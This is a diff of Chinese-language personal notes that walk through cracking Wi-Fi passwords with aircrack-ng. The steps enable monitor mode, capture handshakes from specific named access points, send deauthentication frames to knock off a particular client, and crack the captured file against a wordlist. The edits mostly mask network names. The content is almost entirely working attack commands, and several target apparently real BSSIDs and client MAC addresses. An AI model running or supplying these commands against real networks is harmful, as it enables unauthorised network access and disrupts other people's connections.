@@ -41,7 +41,7 @@ sudo airmon-ng start wlx000d18302a4a   ###########
 ===========================================
 从无线模块的显示列表可以看出，序号2的wifi模块是软硬件是可以启动的，所以，只要将前面默认的模块移出即可；使用命令：
 
-sudo modprobe -r ideapad_laptop    *********
+sudo modprobe -r ideapad_laptop    
 即移出了ideapad的无线模块，再reboot,WIFI模块工作正常 rfkill list     Hard blocked: no
 
 
@@ -58,17 +58,15 @@ sudo airodump-ng wlan0mon   ###########
 
 步骤5：查看连接到目标网络的客户端。
 
-sudo airodump-ng -c 6 --bssid 80:EA:07:BD:B0:07 -w  TP-LINK_B007 wlan0mon     ######
+sudo airodump-ng -c 6 --bssid 80:EA:07:BD:B0:07 -w  TP-LINK_xxxx wlan0mon     ######
 
 
------------------------------------------------------------
 
 
-sudo airodump-ng -c 11 --bssid A8:57:4E:61:D8:DC -w  CMCC-7UYF wlan0mon 
 
-sudo aireplay-ng -0 10 -a  A8:57:4E:61:D8:DC wlan0mon
+sudo airodump-ng -c 11 --bssid A8:57:4E:61:D8:DC -w  CMCC-xxxx wlan0mon 
 
-sudo aireplay-ng -0 10 -a  A8:57:4E:61:D8:DC -c 20:EE:28:4A:A8:CF wlan0mon
+
 
 ---------------------------------------------------------------------
 
@@ -79,9 +77,9 @@ sudo wash -i wlan0mon
 
 步骤6：打开一个新的终端窗口以断开连接到目标网络的客户端。
 
-sudo aireplay-ng -0 10 -a  80:EA:07:BD:B0:07 wlan0mon      ########
+sudo aireplay-ng -0 10 -a  80:EA:07:BD:B0:07 wlan0mon     
 
-sudo aireplay-ng -0 10 -a A8:57:4E:61:D8:DC -c 20:EE:28:4A:A8:CF wlan0mon
+sudo aireplay-ng -0 10 -a A8:57:4E:61:D8:DC -c 20:EE:28:4A:A8:CF wlan0mon        ########
 
 ireplay-ng：注入帧-0：用于取消认证10：发送的去认证报文数
 -a：对于目标网络的bssid
@@ -94,7 +92,7 @@ wlan0mon：接口名称。
 
 
 步骤7.解密密码。打开文件应用程序。
-/home/hacking-01.cap      ########
+/home/hacking-01.cap       ########
 
     hacking-01.cap是您需要的文件。
 aircrack-ng -a2 -b 80：35：C1：13：C1：2C -w /root/passwords.txt /root/hacking-01.cap
